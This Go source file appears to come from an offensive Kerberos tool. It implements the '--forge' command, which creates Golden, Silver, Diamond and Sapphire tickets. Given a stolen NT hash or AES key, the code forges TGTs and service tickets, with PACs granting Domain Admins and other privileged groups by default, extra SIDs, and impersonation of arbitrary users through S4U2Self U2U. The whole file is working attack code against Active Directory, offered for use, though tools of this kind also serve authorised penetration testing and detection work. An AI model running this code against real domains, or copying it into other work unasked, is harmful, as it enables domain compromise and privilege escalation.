// MIT License
//
// # Copyright (c) 2025 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"crypto/rand"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/jfjallid/gokrb5/v8/crypto"
	"github.com/jfjallid/gokrb5/v8/crypto/etype"
	"github.com/jfjallid/gokrb5/v8/iana/etypeID"
	"github.com/jfjallid/gokrb5/v8/iana/flags"
	"github.com/jfjallid/gokrb5/v8/iana/nametype"
	"github.com/jfjallid/gokrb5/v8/keytab"
	"github.com/jfjallid/gokrb5/v8/messages"
	"github.com/jfjallid/gokrb5/v8/pac"
	"github.com/jfjallid/gokrb5/v8/types"
	"github.com/jfjallid/mstypes"
)

var helpForgeOptions = `
    Usage: ` + os.Args[0] + ` --forge [options]
    ` + helpConnectionOptions + `
    options:
          --target  <username>    Username to put in forged or modified ticket
          --user-rid <RID>        Relative id of --target user
          --domain-sid <SID>      SID of domain to use in forged ticket
          --extra-sids <SID>,..	  List of Sids to put in extra sids field of forged ticket
          --groups  <RID>,..      List of group relative ids to but in forged ticket (default 513,512,520,518,519)
          --spn	<SPN>             SPN used to forge a service ticket of format "service/FQDN"
          --duration <duration>   Ticket validity duration for crafted tickets. Format 8h, 30m. (default 10h)
          --logon-server <name>   Logon server to populate forged ticket with
          --impersonate <user>    Create a Saphire ticket, impersonating the specified user through Kerberos U2U
          --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
          --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
          --ccache-file <path>    Filename to write requested/forged ticket to (default creds.ccache)
          --inspect               Inspect content of forged ticket. Requires --sign-nt or --sign-aes
          --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
          --krb5-conf <file>      Read krb5.conf file and use as config
          --request               Request a TGT and modify it (Diamond ticket)
`

func handleForge(args *userArgs) (err error) {
	var makeTGT bool
	var ticket messages.Ticket
	var decryptedEncPart messages.EncTicketPart
	if args.targetUsername == "" {
		log.Errorf("Must specify --target user when crafting a ticket!")
		myFlags.Usage()
	}

	if args.spn == "" {
		// TGT
		makeTGT = true
		if !isFlagSet("out-file") {
			args.targetFile = args.targetUsername + ".ccache"
		}
	} else {
		if !isFlagSet("out-file") {
			fmt.Printf("service: %s\n", args.service)
			fmt.Printf("serviceFQDN: %s\n", args.serviceFQDN)
			args.targetFile = fmt.Sprintf("%s_%s_%s.ccache", args.targetUsername, args.service, args.serviceFQDN)
		}
	}
	if !isFlagSet("groups") {
		args.groups = append(args.groups, []uint32{513, 512, 520, 518, 519}...)
	}

	if args.userRid == 0 {
		log.Errorf("--user-rid cannot be 0")
		myFlags.Usage()
	}

	if (args.signKeyNT != nil && args.signKeyAES != nil) && args.impersonate == "" {
		log.Errorf("Choose ONE of --sign-nt and --sign-aes when crafting tickets")
		myFlags.Usage()
	}
	if args.signKeyNT == nil && args.signKeyAES == nil {
		log.Errorf("Must provide a signing key with either --sign-nt or --sign-aes when crafting a ticket")
		myFlags.Usage()
	}
	if args.signKeyNT != nil && (len(args.signKeyNT) != 16) {
		log.Errorf("Invalid length of NT hash provided with --sign-nt argument")
		myFlags.Usage()
	}
	if args.signKeyAES != nil {
		hashLen := len(args.signKeyAES)
		switch hashLen {
		case 16:
			args.signAes = true
			args.signAes128Key = true
			args.signingKey = args.signKeyAES
		case 32:
			args.signAes = true
			args.signAes256Key = true
			args.signingKey = args.signKeyAES
		default:
			log.Errorf("Invalid length of hex for --sign-aes: %d\n", hashLen)
			myFlags.Usage()
		}
	} else {
		args.signingKey = args.signKeyNT
	}

	if args.ticketDuration.Hours() < 0 {
		log.Errorf("Invalid --duration for ticket. Can't use a negative value")
		myFlags.Usage()
	}

	if args.domainSid.s == "" && !args.request {
		log.Errorf("Must specify a --domain-sid when not using the --request flag")
		myFlags.Usage()
	}

	if makeTGT {
		if args.request {
			// For Diamond ticket
			if args.c == nil {
				err = fmt.Errorf("Kerberos client must be initialized before requesting a ticket")
				return
			}
		}

		ticket, decryptedEncPart, err = forgeTicket(args)
		if err != nil {
			log.Errorln(err)
			return
		}
	} else {
		ticket, decryptedEncPart, err = createTicket(
			args.targetUsername,
			args.userDomain,
			args.serviceDomain,
			args.spn,
			args.signAes,
			args.signingKey,
			args.ticketDuration,
			args.userRid,
			args.domainSid,
			args.groups,
			args.extraSids,
			args.logonServer,
			false,
		)
		if err != nil {
			log.Errorln(err)
			return
		}
	}
	if args.inspect {
		log.Infoln("Inspecting forged ticket before writing to disk")
		err = inspectTicket(&ticket, args.signingKey, args.signAes)
		if err != nil {
			log.Errorln(err)
		}
	}

	err = saveToCCACHE(args, &ticket, &decryptedEncPart, "", false)
	if err != nil {
		log.Errorln(err)
		return
	}
	return
}

func forgeTicket(args *userArgs) (ticket messages.Ticket, decryptedEncPart messages.EncTicketPart, err error) {
	if args.request {
		var templateTicket, st messages.Ticket
		var sessionKey types.EncryptionKey
		var decryptionKey types.EncryptionKey
		var ourPac *pac.PACType
		templateTicket, sessionKey, err = args.c.GetTGT(args.userDomainUpper)
		if err != nil {
			log.Errorln(err)
			return
		}
		decryptionKey, err = decryptTicket(&templateTicket, args.signingKey, args.signAes)
		if err != nil {
			log.Errorln(err)
			return
		}

		if args.impersonate != "" {
			// Replace ClientName in our requested TGT to match that of the target to impersonate
			templateTicket.DecryptedEncPart.CName = types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, args.impersonate)
			st, err = doS4U2SelfU2U(args.c, args.krbConf, args.username, args.userDomain, args.impersonate, templateTicket, sessionKey)
			if err != nil {
				log.Errorln(err)
				return
			}
			_, err = decryptTicket2(&st, sessionKey)
			if err != nil {
				log.Errorln(err)
				return
			}
			log.Infoln("Inspecting Requested S4U2SelfU2U Service ticket")
			err = inspectDecryptedTicket(&st, sessionKey)
			if err != nil {
				log.Errorln(err)
				return
			}
			ourPac, err = getPac(&st.DecryptedEncPart.AuthorizationData, sessionKey)
			if err != nil {
				log.Errorf("Failed to extract the PAC")
				return
			}
			// clear signatures
			if ourPac.KDCChecksum != nil {
				ourPac.KDCChecksum.Signature = make([]byte, len(ourPac.KDCChecksum.Signature))
			}
			if ourPac.ServerChecksum != nil {
				ourPac.ServerChecksum.Signature = make([]byte, len(ourPac.ServerChecksum.Signature))
			}
			if ourPac.PacAttributesInfo == nil {
				// Should be present so we create it
				log.Infoln("PacAttributesInfo missing so adding it to PAC")
				ourPac.PacAttributesInfo = &pac.PacAttributesInfo{
					FlagsLength: 2,
					Flags:       1,
				}
			}
			if ourPac.PacRequestorSid == nil {
				// Should be present so we create it
				if !isFlagSet("user-rid") {
					log.Warningf("The retrieved PAC did not contain the PacRequestorInfo SID so we have to create it. Since a --user-rid is NOT specified we will fallback on the default value of: %d. If you get an error KDC_ERR_TGT_REVOKED you should specify the correct --user-rid\n", args.userRid)
				}
				ourPac.PacRequestorSid = &pac.PacRequestorSid{Sid: args.domainSid.GetRPCSID()}
				ourPac.PacRequestorSid.Sid.SubAuthority = append(ourPac.PacRequestorSid.Sid.SubAuthority, uint32(args.userRid))
				ourPac.PacRequestorSid.Sid.SubAuthorityCount++
			}
			// Fix flags to match that of a TGT rather than ST
			types.SetFlags(&st.DecryptedEncPart.Flags, []int{flags.Forwardable, flags.Proxiable, flags.Renewable, flags.PreAuthent})
			if strings.EqualFold(args.serviceFQDN, args.userDomain) {
				// TGT
				types.SetFlag(&st.DecryptedEncPart.Flags, flags.Initial)
			}
			// Update key type to match that of the requested TGT
			st.DecryptedEncPart.Key.KeyType = templateTicket.EncPart.EType
			switch st.DecryptedEncPart.Key.KeyType {
			case etypeID.AES128_CTS_HMAC_SHA1_96:
				st.DecryptedEncPart.Key.KeyValue = make([]byte, 16)
				_, err = rand.Read(st.DecryptedEncPart.Key.KeyValue)
				if err != nil {
					log.Errorf("Failed to generate a random session key for service ticket: %s\n", err.Error())
					return
				}
			case etypeID.AES256_CTS_HMAC_SHA1_96:
				st.DecryptedEncPart.Key.KeyValue = make([]byte, 32)
				_, err = rand.Read(st.DecryptedEncPart.Key.KeyValue)
				if err != nil {
					log.Errorf("Failed to generate a random session key for service ticket: %s\n", err.Error())
					return
				}
			case etypeID.RC4_HMAC:
				st.DecryptedEncPart.Key.KeyValue = make([]byte, 16)
				_, err = rand.Read(st.DecryptedEncPart.Key.KeyValue)
				if err != nil {
					log.Errorf("Failed to generate a random session key for service ticket: %s\n", err.Error())
					return
				}
			default:
				err = fmt.Errorf("Unknown keytype in received service ticket: %d\n", st.DecryptedEncPart.Key.KeyType)
				return
			}
			// Is this required?
			templateTicket.DecryptedEncPart.AuthTime = st.DecryptedEncPart.AuthTime
			templateTicket.DecryptedEncPart.StartTime = st.DecryptedEncPart.StartTime
			templateTicket.DecryptedEncPart.EndTime = st.DecryptedEncPart.EndTime
			templateTicket.DecryptedEncPart.RenewTill = st.DecryptedEncPart.RenewTill
			templateTicket.DecryptedEncPart.Flags = st.DecryptedEncPart.Flags
		} else {
			// Retrieve PAC from template ticket
			ourPac, err = getPac(&templateTicket.DecryptedEncPart.AuthorizationData, decryptionKey)
			if err != nil {
				log.Errorf("Failed to extract the PAC")
				return
			}
			if isFlagSet("groups") {
				setPacGroups(ourPac.KerbValidationInfo, args.groups)
			}
			if isFlagSet("extra-sids") {
				setPacExtraSids(ourPac.KerbValidationInfo, args.extraSids)
			}

		}
		//NOTE Problem with the encoding when MaximumLength is not same as Length
		// A DC seems send a MaximumLength greater than Length even when the string is not null terminated
		// But only for LogonDomainName and LogonServer.
		// This becomes a problem when re-encoding such a struct as the MaximumLength and Length fields will be left
		// as set by the DC, but the RPC_UNICODE_STRING maxCount, offset and actualCount will be set based on the string.
		// If the KDC reports that a string is null terminated without sending a null terminated string, the MaximumLength
		// will not match the MaxCount and as such the KDC will reject the ticket.
		// So either modify the values, or replace the string and calculate new values
		ourPac.KerbValidationInfo.LogonDomainName.MaximumLength = ourPac.KerbValidationInfo.LogonDomainName.Length
		ourPac.KerbValidationInfo.LogonServer.MaximumLength = ourPac.KerbValidationInfo.LogonServer.Length

		sktab := keytab.New()
		authTime := templateTicket.DecryptedEncPart.AuthTime
		kvno := templateTicket.EncPart.KVNO
		eid := templateTicket.EncPart.EType
		err = sktab.AddKeyEntry(templateTicket.SName.PrincipalNameString(), templateTicket.Realm, args.signingKey, authTime, uint8(kvno), eid)
		if err != nil {
			log.Errorf("error adding entry to keytab: %s\n", err)
			return
		}

		ticket, _, decryptedEncPart, err = messages.NewTicketExt(
			templateTicket.DecryptedEncPart.CName,
			templateTicket.DecryptedEncPart.CRealm,
			templateTicket.SName,
			templateTicket.Realm,
			templateTicket.DecryptedEncPart.Flags,
			sktab,
			eid,
			kvno,
			authTime,
			templateTicket.DecryptedEncPart.StartTime,
			templateTicket.DecryptedEncPart.EndTime,
			templateTicket.DecryptedEncPart.EndTime,
			//templateTicket.DecryptedEncPart.RenewTill, //TODO Fix problem with renewTill
			ourPac,
		)
		if err != nil {
			log.Errorln(err)
			return
		}
	} else {
		ticket, decryptedEncPart, err = createTicket(args.targetUsername, args.userDomain, args.userDomain, fmt.Sprintf("krbtgt/%s", args.userDomainUpper), args.signAes, args.signingKey, args.ticketDuration, args.userRid, args.domainSid, args.groups, args.extraSids, args.logonServer, true)
	}
	return
}

func setPacGroups(kerbInfo *pac.KerbValidationInfo, groups ridList) {
	kerbInfo.GroupCount = uint32(len(groups))
	kerbInfo.GroupIDs = nil
	for _, g := range groups {
		kerbInfo.GroupIDs = append(kerbInfo.GroupIDs, mstypes.GroupMembership{
			RelativeID: g,
			Attributes: 7, // SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
		})
	}
}

func setPacExtraSids(kerbInfo *pac.KerbValidationInfo, eSids SIDS) {
	kerbInfo.SIDCount = uint32(len(eSids))
	kerbInfo.ExtraSIDs = nil
	if len(eSids) > 0 {
		kerbInfo.UserFlags |= 0x20 // Indicate that ExtraSids are present
	}
	for _, s := range eSids {
		kerbInfo.ExtraSIDs = append(kerbInfo.ExtraSIDs, mstypes.KerbSidAndAttributes{
			SID:        s.GetRPCSID(),
			Attributes: 7, // SE_GROUP_MANDATORY | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_ENABLED
		})
	}
}

func createTicket(username, clientDomain, serverDomain, spn string, signAes bool, signingKey []byte, ticketDuration time.Duration, userRid uint64, domainSid SID, groups ridList, extraSids SIDS, logonServer string, isTGT bool) (ticket messages.Ticket, decryptedEncPart messages.EncTicketPart, err error) {
	crealm := strings.ToUpper(clientDomain)
	srealm := strings.ToUpper(serverDomain)
	cname := types.NewPrincipalName(1, username)
	var sname types.PrincipalName
	if isTGT || (clientDomain != serverDomain) {
		// A TGT can only be issued within a realm, and for referral tickets, srealm should be the realm where the ticket was issued
		srealm = crealm
	}
	if strings.Contains(spn, "/") {
		sname = types.NewPrincipalName(nametype.KRB_NT_SRV_INST, spn)
	} else {
		sname = types.NewPrincipalName(nametype.KRB_NT_PRINCIPAL, spn)
	}
	var encType etype.EType
	if signAes && len(signingKey) == 16 {
		encType, err = crypto.GetEtype(etypeID.AES128_CTS_HMAC_SHA1_96)
	} else if signAes && len(signingKey) == 32 {
		encType, err = crypto.GetEtype(etypeID.AES256_CTS_HMAC_SHA1_96)
	} else if len(signingKey) == 16 {
		// Must be NT signing key
		encType, err = crypto.GetEtype(etypeID.RC4_HMAC)
	} else {
		err = fmt.Errorf("Unknown signingKey length: %d\n", len(signingKey))
		return
	}
	if err != nil {
		log.Errorln(err)
		return
	}
	sktab := keytab.New()
	authTime := time.Now().UTC().Round(time.Second)
	startTime := time.Now().UTC().Round(time.Second)
	endTime := time.Now().UTC().Round(time.Second).Add(ticketDuration)
	renewTill := time.Now().UTC().Round(time.Second).Add(ticketDuration)
	kvno := uint8(2) //TODO How is this selected?

	err = sktab.AddKeyEntry(spn, srealm, signingKey, authTime, kvno, encType.GetETypeID())
	if err != nil {
		log.Errorf("error adding entry to keytab: %s\n", err)
		return
	}

	ticketFlags := types.NewKrbFlags()
	//TODO When should I set the flags: OKAsDelegate EncPARep Canonicalize?
	types.SetFlags(&ticketFlags, []int{flags.Forwardable, flags.PreAuthent, flags.Renewable})
	if isTGT {
		types.SetFlag(&ticketFlags, flags.Initial)
	}
	pType, err := createPac(username, clientDomain, uint32(userRid), domainSid.GetRPCSID(), encType, groups, nil, extraSids, logonServer)
	if err != nil {
		log.Errorln(err)
		return
	}
	fmt.Printf("Creating ticket with cname: %s, crealm: %s, sname: %s, and srealm: %s\n", cname.PrincipalNameString(), crealm, sname.PrincipalNameString(), srealm)
	ticket, _, decryptedEncPart, err = messages.NewTicketExt(cname, crealm, sname, srealm, ticketFlags, sktab, encType.GetETypeID(), int(kvno), authTime, startTime, endTime, renewTill, pType)
	if err != nil {
		log.Errorln(err)
		return
	}

	return
}

func createUPNDnsInfo(username, domainName string) (upnDnsInfo *pac.UPNDNSInfo, err error) {
	upnDnsInfo = &pac.UPNDNSInfo{
		Flags:     1, // SAM
		DNSDomain: strings.ToUpper(domainName),
		UPN:       strings.ToLower(username) + "@" + domainName,
	}
	//upnDnsInfo = &pac.UPNDNSInfo{
	//	Flags: 2, // SAM + SID
	//	DNSDomain: strings.ToUpper(domainName),
	//	UPN: strings.ToLower(username) + "@" + strings.ToUpper(domainName),
	//}
	return
}

func createPac(username, domain string, userRid uint32, domainSid mstypes.RPCSID, encType etype.EType, groups ridList, resourceGroups ridList, eSids SIDS, logonServer string) (pType *pac.PACType, err error) {
	netbiosName := strings.ToUpper(strings.Split(domain, ".")[0]) // Netbios names rarely (if ever) contains periods so hoping for the best
	kerbInfo := &pac.KerbValidationInfo{
		LogOnTime:          mstypes.GetFileTime(time.Now().UTC().Round(time.Second)),
		LogOffTime:         mstypes.FileTime{HighDateTime: 0x7FFFFFFF, LowDateTime: 0xFFFFFFFF},
		KickOffTime:        mstypes.FileTime{HighDateTime: 0x7FFFFFFF, LowDateTime: 0xFFFFFFFF},
		PasswordLastSet:    mstypes.GetFileTime(time.Now().UTC().Round(time.Second)),
		PasswordCanChange:  mstypes.GetFileTime(time.Now().UTC().Round(time.Second)),
		PasswordMustChange: mstypes.FileTime{HighDateTime: 0x7FFFFFFF, LowDateTime: 0xFFFFFFFF},
		EffectiveName:      mstypes.RPCUnicodeString{Length: uint16(len(username) * 2), MaximumLength: uint16(len(username) * 2), Value: username},
		LogonCount:         500,
		UserID:             userRid,
		PrimaryGroupID:     513,
		LogonDomainName:    mstypes.RPCUnicodeString{Length: uint16(len(netbiosName) * 2), MaximumLength: uint16(len(netbiosName) * 2), Value: strings.ToUpper(netbiosName)},
		LogonDomainID:      domainSid,
		UserAccountControl: 528, // Normal account (0x10) || Don't expire password (0x200)
	}
	if len(resourceGroups) > 0 {
		kerbInfo.UserFlags |= 0x200 // Indicate that ResourceGroups are present
	}
	if len(eSids) > 0 {
		setPacExtraSids(kerbInfo, eSids)
	}
	if len(groups) > 0 {
		setPacGroups(kerbInfo, groups)
	}
	if logonServer != "" {
		kerbInfo.LogonServer = mstypes.RPCUnicodeString{Length: uint16(len(logonServer) * 2), MaximumLength: uint16(len(logonServer) * 2), Value: strings.ToUpper(logonServer)}
	}

	pType = &pac.PACType{
		KerbValidationInfo: kerbInfo,
		ClientInfo:         &pac.ClientInfo{ClientID: mstypes.GetFileTime(time.Now().UTC().Round(time.Second)), NameLength: uint16(len(username) * 2), Name: username},
		// Seems like I must add support for PacRequestorSid and PacAttributes to support windows server 2022.
		PacRequestorSid: &pac.PacRequestorSid{Sid: mstypes.RPCSID{
			Revision:            domainSid.Revision,
			SubAuthorityCount:   domainSid.SubAuthorityCount + 1, // Add 1 for userRid
			IdentifierAuthority: domainSid.IdentifierAuthority,
			SubAuthority:        append(domainSid.SubAuthority, userRid), // Add userRid to domainSid
		}},
		//TODO Verify against DC on 2022 that this works
		PacAttributesInfo: &pac.PacAttributesInfo{
			FlagsLength: 2,
			Flags:       1,
		},
	}
	pType.UPNDNSInfo, err = createUPNDnsInfo(username, domain)
	if err != nil {
		log.Errorln(err)
		return
	}

	var sigBytes []byte
	encTypeId := encType.GetETypeID()
	switch encTypeId {
	case etypeID.AES128_CTS_HMAC_SHA1_96, etypeID.AES256_CTS_HMAC_SHA1_96:
		sigBytes = make([]byte, 12)
	case etypeID.RC4_HMAC:
		sigBytes = make([]byte, 16)
	default:
		err = fmt.Errorf("Unknown eTypeID to use for PAC signatures: %d", encTypeId)
		return
	}
	pType.ServerChecksum = &pac.SignatureData{SignatureType: uint32(encType.GetHashID()), Signature: sigBytes}
	pType.KDCChecksum = &pac.SignatureData{SignatureType: uint32(encType.GetHashID()), Signature: sigBytes}

	return
}
